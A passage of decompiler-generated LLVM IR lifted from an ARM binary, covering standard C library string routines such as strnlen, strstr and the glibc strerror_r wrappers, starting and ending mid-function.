dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14be0
  %v1_14bf4 = add i32 %v0_14bec, 2
  %v2_14bf4 = inttoptr i32 %v1_14bf4 to i8*
  %v3_14bf4 = load i8, i8* %v2_14bf4, align 1
  %v4_14bf4 = zext i8 %v3_14bf4 to i32
  store i32 %v4_14bf4, i32* %r3.global-to-local, align 4
  %v2_14bf8 = icmp eq i8 %v3_14bf4, 0
  store i1 %v2_14bf8, i1* %cpsr_z.global-to-local, align 1
  %v3_14bfc = add i32 %v5_14be8, 2
  %v4_14bfc = inttoptr i32 %v3_14bfc to i8*
  store i8 %v3_14bf4, i8* %v4_14bfc, align 1
  %v5_14bfc = load i32, i32* %ip.global-to-local, align 4
  %v6_14bfc = add i32 %v5_14bfc, 1
  store i32 %v6_14bfc, i32* %ip.global-to-local, align 4
  %v0_14c00 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c00 = add i32 %v0_14c00, 1
  store i32 %v1_14c00, i32* %r1.global-to-local, align 4
  %v0_14c04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c04, label %dec_label_pc_14c2c, label %dec_label_pc_14c08

dec_label_pc_14c08:                               ; preds = %dec_label_pc_14bf4
  %v1_14c08 = add i32 %v0_14c00, 2
  %v2_14c08 = inttoptr i32 %v1_14c08 to i8*
  %v3_14c08 = load i8, i8* %v2_14c08, align 1
  %v4_14c08 = zext i8 %v3_14c08 to i32
  store i32 %v4_14c08, i32* %r3.global-to-local, align 4
  %v2_14c0c = icmp eq i8 %v3_14c08, 0
  store i1 %v2_14c0c, i1* %cpsr_z.global-to-local, align 1
  %v3_14c10 = add i32 %v5_14bfc, 2
  %v4_14c10 = inttoptr i32 %v3_14c10 to i8*
  store i8 %v3_14c08, i8* %v4_14c10, align 1
  %v5_14c10 = load i32, i32* %ip.global-to-local, align 4
  %v6_14c10 = add i32 %v5_14c10, 1
  store i32 %v6_14c10, i32* %ip.global-to-local, align 4
  %v0_14c14 = load i32, i32* %r1.global-to-local, align 4
  %v1_14c14 = add i32 %v0_14c14, 1
  store i32 %v1_14c14, i32* %r1.global-to-local, align 4
  %v0_14c18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c18, label %dec_label_pc_14c2c, label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14c08
  %v0_14c1c = load i32, i32* @lr, align 4
  %v1_14c1c = add i32 %v0_14c1c, -1
  store i32 %v1_14c1c, i32* @lr, align 4
  %v7_14c1c = icmp eq i32 %v0_14c1c, 1
  store i1 %v7_14c1c, i1* %cpsr_z.global-to-local, align 1
  %v1_14c20 = add i32 %v0_14c14, 2
  store i32 %v1_14c20, i32* @r1, align 4
  br i1 %v7_14c1c, label %dec_label_pc_14c40, label %dec_label_pc_14bd0

dec_label_pc_14c2c:                               ; preds = %dec_label_pc_14c08, %dec_label_pc_14bf4, %dec_label_pc_14be0, %dec_label_pc_14bd0
  %v1_14c2c = phi i32 [ %v6_14c10, %dec_label_pc_14c08 ], [ %v6_14bfc, %dec_label_pc_14bf4 ], [ %v6_14be8, %dec_label_pc_14be0 ], [ %v6_14bd8, %dec_label_pc_14bd0 ]
  %v2_14c2c1 = sub i32 %arg1, %v1_14c2c
  %v2_14c30 = add i32 %v2_14c2c1, %arg2
  store i32 %v2_14c30, i32* %r3.global-to-local, align 4
  %v1_14c34 = add i32 %v2_14c30, -1
  store i32 %v1_14c34, i32* %r2.global-to-local, align 4
  %v7_14c34 = icmp eq i32 %v2_14c30, 1
  store i1 %v7_14c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14c34, label %bb, label %dec_label_pc_14c60

bb:                                               ; preds = %dec_label_pc_14c2c
  ret i32 %arg1

dec_label_pc_14c40:                               ; preds = %dec_label_pc_14c1c, %entry
  %v2_14c506 = phi i32 [ %v1_14bc4, %entry ], [ %v6_14c10, %dec_label_pc_14c1c ]
  %v1_14c40 = urem i32 %arg2, 4
  store i32 %v1_14c40, i32* %r2.global-to-local, align 4
  %v2_14c40 = icmp eq i32 %v1_14c40, 0
  store i1 %v2_14c40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c40, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_14c40
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_14c40, %._crit_edge
  %v2_14c50 = phi i32 [ %v6_14c50, %._crit_edge ], [ %v2_14c506, %dec_label_pc_14c40 ]
  %v0_14c4c = phi i32 [ %v0_14c4c.pre, %._crit_edge ], [ %v1_14c40, %dec_label_pc_14c40 ]
  %v0_14c48 = load i32, i32* @r1, align 4
  %v1_14c48 = inttoptr i32 %v0_14c48 to i8*
  %v2_14c48 = load i8, i8* %v1_14c48, align 1
  %v3_14c48 = zext i8 %v2_14c48 to i32
  store i32 %v3_14c48, i32* %r3.global-to-local, align 4
  %v5_14c48 = add i32 %v0_14c48, 1
  store i32 %v5_14c48, i32* @r1, align 4
  %v1_14c4c = add i32 %v0_14c4c, -1
  store i32 %v1_14c4c, i32* %r2.global-to-local, align 4
  %v7_14c4c = icmp eq i32 %v0_14c4c, 1
  store i1 %v7_14c4c, i1* %cpsr_z.global-to-local, align 1
  %v3_14c50 = add i32 %v2_14c50, 1
  %v4_14c50 = inttoptr i32 %v3_14c50 to i8*
  store i8 %v2_14c48, i8* %v4_14c50, align 1
  %v5_14c50 = load i32, i32* %ip.global-to-local, align 4
  %v6_14c50 = add i32 %v5_14c50, 1
  store i32 %v6_14c50, i32* %ip.global-to-local, align 4
  %v0_14c54 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c54, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_14c58 = load i32, i32* %r3.global-to-local, align 4
  %v2_14c58 = icmp eq i32 %v0_14c58, 0
  store i1 %v2_14c58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c58, label %dec_label_pc_14c60, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_14c4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_14c60:                               ; preds = %dec_label_pc_14c2c, %bb13, %dec_label_pc_14c60
  %v2_14c68 = phi i32 [ %v6_14c68, %dec_label_pc_14c60 ], [ %v1_14c2c, %dec_label_pc_14c2c ], [ %v6_14c50, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c64 = add i32 %v0_14c64, -1
  store i32 %v1_14c64, i32* %r2.global-to-local, align 4
  %v7_14c64 = icmp eq i32 %v0_14c64, 1
  store i1 %v7_14c64, i1* %cpsr_z.global-to-local, align 1
  %v3_14c68 = add i32 %v2_14c68, 1
  %v4_14c68 = inttoptr i32 %v3_14c68 to i8*
  store i8 0, i8* %v4_14c68, align 1
  %v5_14c68 = load i32, i32* %ip.global-to-local, align 4
  %v6_14c68 = add i32 %v5_14c68, 1
  store i32 %v6_14c68, i32* %ip.global-to-local, align 4
  %v0_14c6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c6c, label %dec_label_pc_14c70, label %dec_label_pc_14c60

dec_label_pc_14c70:                               ; preds = %dec_label_pc_14c60
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_14c68, { 1, 0 }
  uselistorder i32 %v0_14c64, { 1, 0 }
  uselistorder i32 %v6_14c50, { 0, 2, 1 }
  uselistorder i32 %v1_14c40, { 2, 1, 0 }
  uselistorder i32 %v2_14c30, { 2, 1, 0 }
  uselistorder i32 %v1_14c20, { 1, 0 }
  uselistorder i32 %v0_14c1c, { 1, 0 }
  uselistorder i32 %v6_14c10, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 4, 1, 2, 3, 0, 5 }
  uselistorder label %dec_label_pc_14c60, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14c74 = load i32, i32* @r1, align 4
  %v2_14c74 = icmp eq i32 %v0_14c74, 0
  br i1 %v2_14c74, label %bb, label %dec_label_pc_14ca4

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_14c8c:                               ; preds = %dec_label_pc_14cb4
  %v3_14c8c = icmp uge i32 %v5_14d40, %v1_14c8c
  %v9_14c8c = icmp eq i32 %v5_14d40, %v1_14c8c
  %v2_14c90 = xor i1 %v3_14c8c, true
  %v3_14c90 = or i1 %v9_14c8c, %v2_14c90
  br i1 %v3_14c90, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_14c8c
  %v6_14c90 = sub i32 %v5_14d40, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14c8c, %bb19
  %v5_14c94 = phi i32 [ %v1_14c8c, %dec_label_pc_14c8c ], [ %v6_14c90, %bb19 ]
  %v2_14c94 = xor i1 %v9_14c8c, true
  %v3_14c94 = and i1 %v3_14c8c, %v2_14c94
  br i1 %v3_14c94, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_14c94 = sub i32 %v5_14c94, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_14c98 = phi i32 [ %v5_14c94, %bb20 ], [ %v6_14c94, %bb21 ]
  ret i32 %v8_14c98

dec_label_pc_14c9c:                               ; preds = %dec_label_pc_14ce8
  br label %dec_label_pc_14d3c

dec_label_pc_14ca4:                               ; preds = %entry
  %v2_14ca4 = add i32 %tmp, %v0_14c74
  %v3_14ca4 = icmp ult i32 %v2_14ca4, %tmp
  br i1 %v3_14ca4, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_14ca4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_14ca4, %bb23
  %v5_14d40 = phi i32 [ %v2_14ca4, %dec_label_pc_14ca4 ], [ -1, %bb23 ]
  %v1_14cc42 = urem i32 %tmp, 4
  %v2_14cc43 = icmp eq i32 %v1_14cc42, 0
  br i1 %v2_14cc43, label %dec_label_pc_14ccc, label %dec_label_pc_14cb4

dec_label_pc_14cb4:                               ; preds = %bb24, %dec_label_pc_14cc0
  %v1_14c8c = phi i32 [ %v1_14cc0, %dec_label_pc_14cc0 ], [ %tmp, %bb24 ]
  %v1_14cb4 = inttoptr i32 %v1_14c8c to i8*
  %v2_14cb4 = load i8, i8* %v1_14cb4, align 1
  %v2_14cb8 = icmp eq i8 %v2_14cb4, 0
  br i1 %v2_14cb8, label %dec_label_pc_14c8c, label %dec_label_pc_14cc0

dec_label_pc_14cc0:                               ; preds = %dec_label_pc_14cb4
  %v1_14cc0 = add i32 %v1_14c8c, 1
  %v1_14cc4 = urem i32 %v1_14cc0, 4
  %v2_14cc4 = icmp eq i32 %v1_14cc4, 0
  br i1 %v2_14cc4, label %dec_label_pc_14ccc, label %dec_label_pc_14cb4

dec_label_pc_14ccc:                               ; preds = %dec_label_pc_14cc0, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_14cc0, %dec_label_pc_14cc0 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_14d2c32 = icmp ult i32 %storemerge.lcssa, %v5_14d40
  br i1 %v3_14d2c32, label %dec_label_pc_14cd4, label %dec_label_pc_14d3c

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14d28, %dec_label_pc_14ccc
  %v0_14c9c39 = phi i32 [ %v4_14cd4, %dec_label_pc_14d28 ], [ %storemerge.lcssa, %dec_label_pc_14ccc ]
  %v1_14cd4 = inttoptr i32 %v0_14c9c39 to i32*
  %v2_14cd4 = load i32, i32* %v1_14cd4, align 4
  %v4_14cd4 = add i32 %v0_14c9c39, 4
  store i32 %v4_14cd4, i32* @lr, align 4
  %v2_14cd8 = add i32 %v2_14cd4, -16843009
  %v2_14cdc = and i32 %v2_14cd8, -2139062144
  %v2_14ce0 = icmp eq i32 %v2_14cdc, 0
  br i1 %v2_14ce0, label %dec_label_pc_14d28, label %dec_label_pc_14ce8

dec_label_pc_14ce8:                               ; preds = %dec_label_pc_14cd4
  %v2_14ce8 = inttoptr i32 %v0_14c9c39 to i8*
  %v3_14ce8 = load i8, i8* %v2_14ce8, align 1
  %v2_14cf0 = icmp eq i8 %v3_14ce8, 0
  %v1_14cf4 = add i32 %v0_14c9c39, 1
  br i1 %v2_14cf0, label %dec_label_pc_14c9c, label %dec_label_pc_14cfc

dec_label_pc_14cfc:                               ; preds = %dec_label_pc_14ce8
  %v2_14cfc = inttoptr i32 %v1_14cf4 to i8*
  %v3_14cfc = load i8, i8* %v2_14cfc, align 1
  %v2_14d00 = icmp eq i8 %v3_14cfc, 0
  br i1 %v2_14d00, label %dec_label_pc_14d3c, label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14cfc
  %v1_14d08 = add i32 %v0_14c9c39, 2
  %v2_14d08 = inttoptr i32 %v1_14d08 to i8*
  %v3_14d08 = load i8, i8* %v2_14d08, align 1
  %v2_14d0c = icmp eq i8 %v3_14d08, 0
  br i1 %v2_14d0c, label %dec_label_pc_14d3c, label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d08
  %v1_14d18 = add i32 %v0_14c9c39, 3
  %v2_14d18 = inttoptr i32 %v1_14d18 to i8*
  %v3_14d18 = load i8, i8* %v2_14d18, align 1
  %v2_14d1c = icmp eq i8 %v3_14d18, 0
  br i1 %v2_14d1c, label %dec_label_pc_14d3c, label %dec_label_pc_14d28

dec_label_pc_14d28:                               ; preds = %dec_label_pc_14d18, %dec_label_pc_14cd4
  %v3_14d2c = icmp ult i32 %v4_14cd4, %v5_14d40
  br i1 %v3_14d2c, label %dec_label_pc_14cd4, label %dec_label_pc_14d3c

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14d28, %dec_label_pc_14ccc, %dec_label_pc_14cfc, %dec_label_pc_14d08, %dec_label_pc_14d18, %dec_label_pc_14c9c
  %v1_14d3c = phi i32 [ %v0_14c9c39, %dec_label_pc_14c9c ], [ %storemerge.lcssa, %dec_label_pc_14ccc ], [ %v1_14cf4, %dec_label_pc_14cfc ], [ %v1_14d08, %dec_label_pc_14d08 ], [ %v1_14d18, %dec_label_pc_14d18 ], [ %v5_14d40, %dec_label_pc_14d28 ]
  %v3_14d3c = icmp uge i32 %v5_14d40, %v1_14d3c
  %v9_14d3c = icmp eq i32 %v5_14d40, %v1_14d3c
  %v2_14d40 = xor i1 %v3_14d3c, true
  %v3_14d40 = or i1 %v9_14d3c, %v2_14d40
  br i1 %v3_14d40, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14d3c
  %v6_14d40 = sub i32 %v5_14d40, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_14d3c, %bb25
  %v5_14d44 = phi i32 [ %v1_14d3c, %dec_label_pc_14d3c ], [ %v6_14d40, %bb25 ]
  %v2_14d44 = xor i1 %v9_14d3c, true
  %v3_14d44 = and i1 %v3_14d3c, %v2_14d44
  br i1 %v3_14d44, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_14d44 = sub i32 %v5_14d44, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_14d48 = phi i32 [ %v5_14d44, %bb26 ], [ %v6_14d44, %bb27 ]
  ret i32 %v8_14d48

; uselistorder directives
  uselistorder i1 %v3_14d3c, { 1, 0 }
  uselistorder i32 %v4_14cd4, { 1, 2, 0 }
  uselistorder i32 %v0_14c9c39, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14cc0, { 1, 0, 2 }
  uselistorder i32 %v1_14c8c, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_14d40, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_14c8c, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_14d3c, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_14cb4, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_14d54 = load i32, i32* @r5, align 4
  %v9_14d54 = load i32, i32* @r6, align 4
  %v3_14d58 = load i8, i8* %arg2, align 1
  %v2_14d5c = icmp eq i8 %v3_14d58, 0
  br i1 %v2_14d5c, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_14d64 = add i32 %arg1, -1
  br label %dec_label_pc_14d68

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d74, %bb50
  %v0_14d68 = phi i32 [ %v1_14d68, %dec_label_pc_14d74 ], [ %v1_14d64, %bb50 ]
  %v1_14d68 = add i32 %v0_14d68, 1
  %v2_14d68 = inttoptr i32 %v1_14d68 to i8*
  %v3_14d68 = load i8, i8* %v2_14d68, align 1
  %v2_14d6c = icmp eq i8 %v3_14d68, 0
  br i1 %v2_14d6c, label %dec_label_pc_14e44, label %dec_label_pc_14d74

dec_label_pc_14d74:                               ; preds = %dec_label_pc_14d68
  %v9_14d74 = icmp eq i8 %v3_14d68, %v3_14d58
  br i1 %v9_14d74, label %dec_label_pc_14d7c, label %dec_label_pc_14d68

dec_label_pc_14d7c:                               ; preds = %dec_label_pc_14d74
  %v2_14d7c = add i32 %tmp, 1
  %v3_14d7c = inttoptr i32 %v2_14d7c to i8*
  %v4_14d7c = load i8, i8* %v3_14d7c, align 1
  %v2_14d80 = icmp eq i8 %v4_14d7c, 0
  br i1 %v2_14d80, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_14d7c
  store i32 %v6_14d54, i32* @r5, align 4
  store i32 %v9_14d54, i32* @r6, align 4
  ret i32 %v1_14d68

bb52:                                             ; preds = %dec_label_pc_14d7c
  %v1_14d8c = add i32 %v0_14d68, 2
  %v1_14de0 = add i32 %tmp, 2
  %v2_14de0 = inttoptr i32 %v1_14de0 to i8*
  br label %dec_label_pc_14dd8

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14e38
  %v3_14d9c = load i8, i8* %v3_14dd0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_14dc8.preheader

dec_label_pc_14dc8.preheader:                     ; preds = %dec_label_pc_14d9c, %dec_label_pc_14dd8
  %v0_14dc84.in = phi i8 [ %v3_14d9c, %dec_label_pc_14d9c ], [ %v3_14dd0.pn, %dec_label_pc_14dd8 ]
  %v9_14dc813 = icmp eq i8 %v0_14dc84.in, %v3_14d58
  br i1 %v9_14dc813, label %dec_label_pc_14dd0, label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14dc8.preheader, %dec_label_pc_14dc4
  %v0_14db0 = phi i32 [ %v1_14dc4, %dec_label_pc_14dc4 ], [ %storemerge43, %dec_label_pc_14dc8.preheader ]
  %v0_14da8.in = phi i8 [ %v3_14dc4, %dec_label_pc_14dc4 ], [ %v0_14dc84.in, %dec_label_pc_14dc8.preheader ]
  %v2_14da8 = icmp eq i8 %v0_14da8.in, 0
  br i1 %v2_14da8, label %dec_label_pc_14e44, label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14da8
  %v1_14db0 = add i32 %v0_14db0, 1
  %v2_14db0 = inttoptr i32 %v1_14db0 to i8*
  %v3_14db0 = load i8, i8* %v2_14db0, align 1
  store i32 %v1_14db0, i32* @ip, align 4
  %v9_14db4 = icmp eq i8 %v3_14db0, %v3_14d58
  br i1 %v9_14db4, label %dec_label_pc_14dd0, label %dec_label_pc_14dbc

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14db0
  %v2_14dbc = icmp eq i8 %v3_14db0, 0
  br i1 %v2_14dbc, label %dec_label_pc_14e44, label %dec_label_pc_14dc4

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14dbc
  %v1_14dc4 = add i32 %v0_14db0, 2
  %v2_14dc4 = inttoptr i32 %v1_14dc4 to i8*
  %v3_14dc4 = load i8, i8* %v2_14dc4, align 1
  store i32 %v1_14dc4, i32* @ip, align 4
  %v9_14dc8 = icmp eq i8 %v3_14dc4, %v3_14d58
  br i1 %v9_14dc8, label %dec_label_pc_14dd0, label %dec_label_pc_14da8

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14db0, %dec_label_pc_14dc4, %dec_label_pc_14dc8.preheader
  %v0_14dd0 = phi i32 [ %storemerge43, %dec_label_pc_14dc8.preheader ], [ %v1_14db0, %dec_label_pc_14db0 ], [ %v1_14dc4, %dec_label_pc_14dc4 ]
  %v1_14dd0 = add i32 %v0_14dd0, 1
  br label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %bb52, %dec_label_pc_14dd0
  %storemerge43 = phi i32 [ %v1_14dd0, %dec_label_pc_14dd0 ], [ %v1_14d8c, %bb52 ]
  %v3_14dd0.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_14dd0.pn = load i8, i8* %v3_14dd0.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_14dd0.pn, %v4_14d7c
  br i1 %storemerge, label %dec_label_pc_14ddc, label %dec_label_pc_14dc8.preheader

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14dd8
  %v1_14ddc = add i32 %storemerge43, 1
  %v2_14ddc = inttoptr i32 %v1_14ddc to i8*
  %v3_14ddc = load i8, i8* %v2_14ddc, align 1
  %v4_14ddc = zext i8 %v3_14ddc to i32
  %v3_14de0 = load i8, i8* %v2_14de0, align 1
  %v4_14de0 = zext i8 %v3_14de0 to i32
  %v1_14de4 = add i32 %storemerge43, -1
  %v9_14de8 = icmp eq i8 %v3_14ddc, %v3_14de0
  store i32 %v1_14de0, i32* @lr, align 4
  store i32 %v1_14ddc, i32* @ip, align 4
  br i1 %v9_14de8, label %dec_label_pc_14df8, label %dec_label_pc_14e38

dec_label_pc_14df8:                               ; preds = %dec_label_pc_14ddc, %dec_label_pc_14df4
  %v0_14e10 = phi i32 [ %v1_14e18, %dec_label_pc_14df4 ], [ %v1_14de0, %dec_label_pc_14ddc ]
  %v0_14e08 = phi i32 [ %v1_14e14, %dec_label_pc_14df4 ], [ %v1_14ddc, %dec_label_pc_14ddc ]
  %v0_14df8 = phi i32 [ %v4_14e28, %dec_label_pc_14df4 ], [ %v4_14ddc, %dec_label_pc_14ddc ]
  %v2_14df8 = icmp eq i32 %v0_14df8, 0
  br i1 %v2_14df8, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_14df8
  store i32 %v6_14d54, i32* @r5, align 4
  store i32 %v9_14d54, i32* @r6, align 4
  ret i32 %v1_14de4

bb54:                                             ; preds = %dec_label_pc_14df8
  %v1_14e00 = add i32 %v0_14e08, 1
  %v2_14e00 = inttoptr i32 %v1_14e00 to i8*
  %v3_14e00 = load i8, i8* %v2_14e00, align 1
  %v1_14e04 = add i32 %v0_14e10, 1
  %v2_14e04 = inttoptr i32 %v1_14e04 to i8*
  %v3_14e04 = load i8, i8* %v2_14e04, align 1
  %v4_14e04 = zext i8 %v3_14e04 to i32
  store i32 %v1_14e00, i32* @r1, align 4
  %v9_14e0c = icmp eq i8 %v3_14e00, %v3_14e04
  %v1_14e14 = add i32 %v0_14e08, 2
  store i32 %v1_14e14, i32* @ip, align 4
  %v1_14e18 = add i32 %v0_14e10, 2
  store i32 %v1_14e18, i32* @lr, align 4
  br i1 %v9_14e0c, label %dec_label_pc_14e20, label %dec_label_pc_14e38

dec_label_pc_14e20:                               ; preds = %bb54
  %v2_14e20 = icmp eq i8 %v3_14e00, 0
  br i1 %v2_14e20, label %bb55, label %dec_label_pc_14df4

bb55:                                             ; preds = %dec_label_pc_14e20
  store i32 %v6_14d54, i32* @r5, align 4
  store i32 %v9_14d54, i32* @r6, align 4
  ret i32 %v1_14de4

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14e20
  %v2_14e28 = inttoptr i32 %v1_14e18 to i8*
  %v3_14e28 = load i8, i8* %v2_14e28, align 1
  %v4_14e28 = zext i8 %v3_14e28 to i32
  %v2_14e2c = inttoptr i32 %v1_14e14 to i8*
  %v3_14e2c = load i8, i8* %v2_14e2c, align 1
  %v9_14e30 = icmp eq i8 %v3_14e2c, %v3_14e28
  br i1 %v9_14e30, label %dec_label_pc_14df8, label %dec_label_pc_14e38

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14df4, %bb54, %dec_label_pc_14ddc
  %v0_14e38 = phi i32 [ %v4_14de0, %dec_label_pc_14ddc ], [ %v4_14e28, %dec_label_pc_14df4 ], [ %v4_14e04, %bb54 ]
  %v2_14e38 = icmp eq i32 %v0_14e38, 0
  br i1 %v2_14e38, label %dec_label_pc_14e40, label %dec_label_pc_14d9c

dec_label_pc_14e40:                               ; preds = %dec_label_pc_14e38
  store i32 %v6_14d54, i32* @r5, align 4
  store i32 %v9_14d54, i32* @r6, align 4
  ret i32 %v1_14de4

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14d68, %dec_label_pc_14dbc, %dec_label_pc_14da8
  store i32 %v6_14d54, i32* @r5, align 4
  store i32 %v9_14d54, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14e18, { 0, 2, 1 }
  uselistorder i32 %v1_14e14, { 1, 2, 0 }
  uselistorder i32 %v1_14de4, { 2, 1, 0 }
  uselistorder i8 %v3_14dd0.pn, { 1, 0 }
  uselistorder i8* %v3_14dd0.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_14dc4, { 1, 0 }
  uselistorder i32 %v1_14dc4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14d68, { 0, 2, 1 }
  uselistorder i8 %v3_14d58, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_14d54, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_14d54, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14e44, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14df8, { 1, 0 }
  uselistorder label %dec_label_pc_14dd8, { 1, 0 }
  uselistorder label %dec_label_pc_14dd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14da8, { 1, 0 }
  uselistorder label %dec_label_pc_14dc8.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14e54 = call i32 @__xpg_strerror_r()
  %v0_14e58 = load i32, i32* @r4, align 4
  ret i32 %v0_14e58
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_14e60 = load i32, i32* @r4, align 4
  %v0_14e64 = load i32, i32* @r0, align 4
  %v0_14e70 = load i32, i32* @r1, align 4
  store i32 %v0_14e70, i32* @r8, align 4
  %v0_14e74 = load i32, i32* @r2, align 4
  store i32 %v0_14e74, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_14e64, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_14eac

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1cd10.933 to i32), i32* @r5, align 4
  %v2_14e943547 = icmp eq i32 %v0_14e64, 0
  br i1 %v2_14e943547, label %bb27, label %dec_label_pc_14e88.lr.ph

dec_label_pc_14e88:                               ; preds = %dec_label_pc_14e88.lr.ph, %bb
  %v2_14ea042 = phi i1 [ %v2_14ea03950, %dec_label_pc_14e88.lr.ph ], [ %v2_14ea0, %bb ]
  %v1_14ea441 = phi i32 [ %v0_14e94.pr49, %dec_label_pc_14e88.lr.ph ], [ %v2_14e90, %bb ]
  %v0_14e8c40 = phi i32 [ %v0_14e98648, %dec_label_pc_14e88.lr.ph ], [ %v1_14e8c, %bb ]
  %v1_14e8c = add i32 %v0_14e8c40, 1
  store i32 %v1_14e8c, i32* @r5, align 4
  br i1 %v2_14ea042, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_14e88
  %v2_14e90 = add i32 %v1_14ea441, -1
  %v2_14e94 = icmp eq i32 %v2_14e90, 0
  %v1_14e98 = inttoptr i32 %v1_14e8c to i8*
  %v2_14e98 = load i8, i8* %v1_14e98, align 1
  %v2_14ea0 = icmp eq i8 %v2_14e98, 0
  br i1 %v2_14e94, label %dec_label_pc_14ea0, label %dec_label_pc_14e88

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_14e88
  %v1_14e9836 = inttoptr i32 %v1_14e8c to i8*
  %v2_14e9837 = load i8, i8* %v1_14e9836, align 1
  %v2_14ea039 = icmp eq i8 %v2_14e9837, 0
  br label %dec_label_pc_14e88.lr.ph

dec_label_pc_14e88.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
